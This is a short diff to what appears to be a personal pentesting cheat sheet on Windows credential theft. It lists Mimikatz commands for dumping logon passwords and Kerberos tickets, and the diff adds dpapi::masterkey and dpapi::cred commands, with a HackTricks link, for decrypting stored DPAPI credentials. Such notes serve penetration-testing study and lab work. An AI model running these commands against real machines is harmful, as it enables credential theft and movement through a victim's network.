@@ -12,6 +12,12 @@
 - ```privilege::debug``` to engage the SeDebugPrivlege8 privilege, which will allow us to interact with a process owned by another account.
 - ``` sekurlsa::logonpasswords ``` get cached password that loggin this pc
 - ``` sekurlsa::tickets ``` get cached ticket 
+- DPAPI cred dump :https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords  
+1.  ``` 
+    dpapi::masterkey /in:\users\0xdf\desktop\masterkey /sid:S-1-5-21-953262931-566350628-63446256-1001 /password:{password}
+
+    dpapi::cred /in:\users\0xdf\desktop\credentials
+    ```
 
 # Attack AD
 ## Password attack/ Spray
